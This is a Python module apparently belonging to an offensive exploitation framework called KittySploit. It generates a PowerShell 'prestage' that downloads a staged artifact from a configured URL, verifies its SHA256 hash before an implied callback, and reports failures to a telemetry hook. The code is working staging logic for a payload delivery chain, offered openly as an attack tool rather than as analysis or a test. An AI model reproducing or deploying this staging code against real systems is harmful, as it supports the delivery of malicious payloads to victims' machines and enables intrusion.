#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from typing import Any, Dict

from kittysploit import *


class Module(Prestage):
    PRESTAGE_ID = "stage_verify"

    __info__ = {
        "name": "Stage Verify (PowerShell)",
        "description": "Verify staged artifact SHA256 before callback",
        "author": "KittySploit Team",
        "version": "1.0.0",
        "platform": Platform.MULTI,
        "languages": ["powershell"],
        "prestage_dependencies": ["telemetry_buffer"],
        "tags": ["prestage", "offline", "staging", "powershell"],
    }

    stage_url = OptString("", "Stage URL to verify", False)
    stage_sha256 = OptString("", "Expected SHA256 of staged artifact", False)

    def generate_powershell(self, context: Dict[str, Any] = None) -> str:
        ctx = dict(context or {})
        stage_url = str(ctx.get("prestage_stage_url") or getattr(getattr(self, "stage_url", None), "value", "") or "").replace("'", "''")
        stage_sha256 = str(ctx.get("prestage_stage_sha256") or getattr(getattr(self, "stage_sha256", None), "value", "") or "").lower()
        if not stage_url and not stage_sha256:
            return "# stage_verify: no stage_url/sha256 configured"
        return f"""
$ErrorActionPreference='Stop'
try {{
  $bytes=$null
  if('{stage_url}'){{
    if($global:_kitty_stage_cache){{ $bytes=$global:_kitty_stage_cache.fetch('{stage_url}','{stage_sha256}') }}
    else {{ $bytes=(Invoke-WebRequest -Uri '{stage_url}' -UseBasicParsing -TimeoutSec 30).Content }}
  }}
  if('{stage_sha256}'){{
    $sha=[System.Security.Cryptography.SHA256]::Create()
    $digest=([BitConverter]::ToString($sha.ComputeHash([byte[]]$bytes))).Replace('-','').ToLower()
    if($digest -ne '{stage_sha256}'){{ throw 'stage sha256 mismatch' }}
  }}
}} catch {{
  try {{ _KittyTelemetryRecord 'stage_verify' 'failed' $_.Exception.Message }} catch {{}}
  throw
}}
""".strip()
